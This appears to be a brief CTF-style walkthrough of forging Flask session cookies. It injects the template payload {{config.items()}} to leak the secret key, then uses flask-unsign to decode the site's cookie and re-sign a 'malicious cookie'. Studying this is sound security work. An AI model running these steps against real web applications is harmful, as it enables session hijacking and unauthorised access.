- - - 
## **Exploitation Steps** :

Install the tool : 
```python
sudo pip3 install flask-unsign
```

first inject **``{{config.items()}}``** to find the value of **<mark style="background: #FF5582A6;">Secret-key</mark>**.  

Now, Copy the cookie from the website.

```sh
flask-unsign --decode --cookie '<cookie>'
```

![1000](https://i.imgur.com/FAjZSAG.png)

copy the output and use it to build a new malicious cookie.

```sh
flask-unsign --sign --cookie "<output>" --secret '<Secret-key>'
```

![1300](https://i.imgur.com/qq1myf7.png)

Replace this cookie with your's and 💥️💥️💥️ MAGIC 🪄️🪄️

